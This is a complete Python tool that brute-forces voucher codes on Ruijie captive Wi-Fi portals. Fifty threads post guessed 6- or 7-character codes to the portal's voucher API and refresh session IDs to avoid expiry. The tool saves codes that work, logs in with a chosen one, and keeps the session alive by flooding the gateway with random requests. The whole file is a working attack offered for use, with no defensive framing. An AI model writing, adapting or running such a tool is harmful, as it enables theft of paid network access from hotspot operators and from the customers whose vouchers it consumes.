#!/usr/bin/env python3
"""
Ruijie Voucher Brute-Force v3
Full range 000000-999999 / 0000000-9999999
Bitmap tracking for memory efficiency (125KB / 1.25MB)
"""
import sys, threading, time, urllib.parse, queue, random, os, datetime
import requests, urllib3
urllib3.disable_warnings()

CODES_FILE = "valid_codes.txt"
LOCK = threading.Lock()
BITMAP_LOCK = threading.Lock()
STOP = threading.Event()
FOUND_LIST = []
TRIED = 0
TOTAL_CODES = 0

# For Nuitka compilation:
# pip install nuitka
# nuitka brute.py --standalone --onefile --output-dir=build
# ./build/brute

# ===== Helpers =====

def save_code(code):
    with open(CODES_FILE, "a") as f:
        f.write(f"{code}\n")

def load_codes():
    if not os.path.exists(CODES_FILE):
        return []
    with open(CODES_FILE) as f:
        return [l.strip() for l in f if l.strip()]

def remove_codes(codes_to_remove):
    codes = load_codes()
    keep = [c for c in codes if c not in codes_to_remove]
    with open(CODES_FILE, "w") as f:
        for c in keep: f.write(f"{c}\n")

def fmt_eta(rem, rate):
    if rate <= 0: return "?m"
    s = rem / rate
    h, r = divmod(int(s), 3600)
    m, s = divmod(r, 60)
    return f"{h}h{m:02d}m" if h else f"{m}m{s:02d}s"

def detect_portal():
    sess = requests.Session()
    sess.verify = False
    sess.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
    r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10, allow_redirects=False)
    if r.status_code == 204:
        return None, None, None, None, "Already online"
    portal_url = r.headers.get("Location", "")
    if not portal_url:
        r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10, allow_redirects=True)
        portal_url = r.url
    if not portal_url or portal_url == "http://connectivitycheck.gstatic.com/generate_204":
        return None, None, None, None, "No portal detected"
    parsed = urllib.parse.urlparse(portal_url)
    params = parsed.query
    host = f"{parsed.scheme}://{parsed.netloc}"
    qp = urllib.parse.parse_qs(params)
    sid = qp.get("sessionId", [""])[0]
    if not sid:
        r = sess.get(f"{host}/api/auth/wifidog?stage=portal&{params}", timeout=10)
        sid = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId", [""])[0]
    if not sid:
        return None, None, None, None, "No sessionId"
    gw_addr = qp.get("gw_address", ["192.168.10.1"])[0]
    gw_port = qp.get("gw_port", ["2060"])[0]
    return sess, host, params, sid, (gw_addr, gw_port)

def refresh_session(host, params):
    try:
        rs = requests.Session()
        r = rs.get(f"{host}/api/auth/wifidog?stage=portal&{params}", timeout=10)
        ns = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId", [""])[0]
        rs.close()
        return ns
    except: return None

# ===== Numeric Brute Force (bitmap, full range) =====

def numeric_worker(length, host, params, refresh_every):
    global TRIED
    sess = requests.Session()
    sess.verify = False
    sess.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
    api_url = f"{host}/api/auth/voucher/?lang=en_US"
    total = 10 ** length
    local_count = 0
    local_errors = 0

    while not STOP.is_set():
        code_int = random.randrange(total)
        code = str(code_int).zfill(length)

        with LOCK:
            sid = SID_DATA["sid"]

        try:
            r = sess.post(api_url, json={
                "accessCode": code, "sessionId": sid, "apiVersion": 1
            }, timeout=5)
            j = r.json()
            if j.get("success") == True and j.get("result", {}).get("authResult") == "1":
                with LOCK:
                    print(f"\n  >>> VALID: {code}")
                    save_code(code)
                    FOUND_LIST.append(code)
            local_errors = 0
        except:
            local_errors += 1
            if local_errors > 10:
                time.sleep(1)

        with LOCK:
            TRIED += 1

        local_count += 1
        if local_count >= refresh_every:
            ns = refresh_session(host, params)
            if ns:
                with LOCK: SID_DATA["sid"] = ns
            local_count = 0

    sess.close()

def numeric_bruteforce(length):
    global TOTAL_CODES, TRIED, SID_DATA, STOP
    STOP.clear()
    TRIED = 0
    FOUND_LIST.clear()
    TOTAL_CODES = 10 ** length

    result = detect_portal()
    sess, host, params, sid, extra = result
    if isinstance(extra, str):
        print(f"[!] {extra}")
        return
    gw = extra

    SID_DATA = {"sid": sid}

    print(f"Range: {'0'*length}-{'9'*length} ({TOTAL_CODES:,} codes)")
    print(f"Host: {host}  GW: {gw[0]}:{gw[1]}")
    print(f"Session: {sid[:16]}...  Threads: 50")
    print("Brute forcing (Ctrl+C to stop)\n")

    threads = []
    for _ in range(50):
        t = threading.Thread(target=numeric_worker,
            args=(length, host, params, 500), daemon=True)
        t.start()
        threads.append(t)

    last_tried = 0
    try:
        while any(t.is_alive() for t in threads):
            time.sleep(3)
            with LOCK:
                tried = TRIED
            rate = (tried - last_tried) / 3
            rem = TOTAL_CODES - tried
            eta = fmt_eta(rem, rate) if rate > 0 else "?m"
            pct = tried * 100 / TOTAL_CODES
            sys.stdout.write(f"\r  {tried:,}/{TOTAL_CODES:,} ({pct:.2f}%) | {rate:.0f}/s | ETA: {eta} | Found: {len(FOUND_LIST)}")
            sys.stdout.flush()
            last_tried = tried
    except KeyboardInterrupt:
        print("\n[Stopped]")
    STOP.set()
    print(f"\nDone. Found {len(FOUND_LIST)} valid codes")

# ===== Alphanumeric Brute Force (random generation) =====

def charset_worker(charset, length, host, params, refresh_every):
    global TRIED
    sess = requests.Session()
    sess.verify = False
    sess.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
    api_url = f"{host}/api/auth/voucher/?lang=en_US"
    local_count = 0
    local_errors = 0

    while not STOP.is_set():
        code = ''.join(random.choices(charset, k=length))

        with LOCK:
            sid = SID_DATA["sid"]

        try:
            r = sess.post(api_url, json={
                "accessCode": code, "sessionId": sid, "apiVersion": 1
            }, timeout=5)
            j = r.json()
            if j.get("success") == True and j.get("result", {}).get("authResult") == "1":
                with LOCK:
                    print(f"\n  >>> VALID: {code}")
                    save_code(code)
                    FOUND_LIST.append(code)
            local_errors = 0
        except:
            local_errors += 1
            if local_errors > 10:
                time.sleep(1)

        with LOCK:
            TRIED += 1

        local_count += 1
        if local_count >= refresh_every:
            ns = refresh_session(host, params)
            if ns:
                with LOCK: SID_DATA["sid"] = ns
            local_count = 0

    sess.close()

def charset_bruteforce(charset, length, label):
    global TOTAL_CODES, TRIED, SID_DATA, STOP
    STOP.clear()
    TRIED = 0
    FOUND_LIST.clear()
    TOTAL_CODES = len(charset) ** length

    result = detect_portal()
    sess, host, params, sid, extra = result
    if isinstance(extra, str):
        print(f"[!] {extra}")
        return
    gw = extra

    SID_DATA = {"sid": sid}

    print(f"Charset: {label}  Length: {length}  Space: {TOTAL_CODES:,}")
    print(f"Host: {host}  GW: {gw[0]}:{gw[1]}")
    print(f"Session: {sid[:16]}...  Threads: 50")
    print("Generating random codes (Ctrl+C to stop)\n")

    threads = []
    for _ in range(50):
        t = threading.Thread(target=charset_worker,
            args=(charset, length, host, params, 500), daemon=True)
        t.start()
        threads.append(t)

    last_tried = 0
    try:
        while any(t.is_alive() for t in threads):
            time.sleep(3)
            with LOCK:
                tried = TRIED
            rate = (tried - last_tried) / 3
            sys.stdout.write(f"\r  Tried: {tried:,} | {rate:.0f}/s | Found: {len(FOUND_LIST)}")
            sys.stdout.flush()
            last_tried = tried
    except KeyboardInterrupt:
        print("\n[Stopped]")
    STOP.set()
    print(f"\nDone. Found {len(FOUND_LIST)} valid codes")

# ===== Menu =====

def ask_length():
    while True:
        l = input("Length (6 or 7): ").strip()
        if l in ("6", "7"):
            return int(l)
        print("Enter 6 or 7")

def menu():
    while True:
        print("\n" + "=" * 40)
        print("  RUIJIE VOUCHER BRUTE-FORCE")
        print("=" * 40)
        print("1. Numeric (000000-999999 / 0000000-9999999)")
        print("2. Uppercase + Lowercase (random)")
        print("3. Lowercase + Numbers (random)")
        print("4. View saved codes")
        print("5. Login & validate codes")
        print("Q. Quit")
        print("=" * 40)
        choice = input("Choose: ").strip().upper()

        if choice == "1":
            length = ask_length()
            numeric_bruteforce(length)
        elif choice == "2":
            length = ask_length()
            charset_bruteforce(
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", length, "UL")
        elif choice == "3":
            length = ask_length()
            charset_bruteforce(
                "abcdefghijklmnopqrstuvwxyz0123456789", length, "lN")
        elif choice == "4":
            view_codes()
        elif choice == "5":
            login_menu()
        elif choice == "Q":
            print("Bye"); sys.exit(0)

def view_codes():
    codes = load_codes()
    if not codes:
        print("No saved codes")
        return
    print(f"\nSaved codes ({len(codes)}):")
    for i, c in enumerate(codes, 1):
        print(f"  {i:4d}. {c}")

def login_menu():
    codes = load_codes()
    if not codes:
        print("No saved codes")
        return

    print("\nChecking saved codes (may consume them)...")
    result = detect_portal()
    sess, host, params, sid, extra = result
    if isinstance(extra, str):
        print(f"[!] {extra}")
        return
    gw = extra

    api_url = f"{host}/api/auth/voucher/?lang=en_US"
    valid = []
    invalid = []
    for code in codes:
        try:
            r = sess.post(api_url, json={
                "accessCode": code, "sessionId": sid, "apiVersion": 1
            }, timeout=5)
            j = r.json()
            if j.get("success") == True and j.get("result", {}).get("authResult") == "1":
                valid.append((code, j["result"]["logonUrl"]))
            else:
                invalid.append(code)
        except:
            invalid.append(code)
        print(f"  {code}: {'VALID' if code in [v[0] for v in valid] else 'INVALID'}")

    if invalid:
        remove_codes(invalid)
        print(f"Removed {len(invalid)} invalid codes")

    if not valid:
        print("No valid codes remaining")
        return

    print(f"\nValid codes ({len(valid)}):")
    for i, (code, _) in enumerate(valid, 1):
        print(f"  {i}. {code}")

    choice = input("Enter number to login (0 to cancel): ").strip()
    if not choice.isdigit() or int(choice) < 1 or int(choice) > len(valid):
        return

    idx = int(choice) - 1
    code, logon_url = valid[idx]
    print(f"Using: {code}")
    r = sess.get(logon_url, timeout=5, allow_redirects=False)
    print(f"Gateway: {r.status_code}")
    time.sleep(2)

    if requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=False).status_code == 204:
        print("*** ONLINE ***")
        remove_codes([code])
        print(f"Removed {code} from saved codes")
        def ka():
            while True:
                sess.post(f"http://{gw[0]}:{gw[1]}/wifidog/auth",
                    params={"token": sid, "phoneNumber": ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=15))},
                    headers={"Content-Type": "application/octet-stream", "Content-Length": "0"},
                    timeout=3)
                time.sleep(0.1)
        threading.Thread(target=ka, daemon=True).start()
        print("Keepalive running. Ctrl+C to stop.")
        try:
            while True: time.sleep(10)
        except KeyboardInterrupt: print("\nDone")
    else:
        loc = r.headers.get("Location", "")
        if loc:
            sess.get(loc, timeout=5)
            if requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=False).status_code == 204:
                print("*** ONLINE ***")
                remove_codes([code])

if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        print("\nBye")
